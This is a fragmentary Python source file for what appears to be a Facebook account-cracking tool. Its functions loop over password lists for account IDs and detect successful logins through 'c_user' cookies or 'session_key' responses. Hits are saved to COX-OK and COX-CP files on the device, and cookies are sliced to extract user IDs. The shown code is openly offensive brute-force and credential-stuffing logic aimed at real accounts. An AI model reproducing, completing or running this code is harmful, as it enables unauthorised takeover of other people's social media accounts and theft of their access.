        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [COX-OK] %s | %s'%(ids,pas))
...
def bd():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Code example: 0301,0314,0345,0310')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[COX-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[COX-CP] '+idf+' | '+ps+'\033[0;97m')
...
def apix(ids,passlist):
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [COX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/COX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [COX-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/COX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/COX-CP.txt','a').write(ids+'|'+pas+'\n')
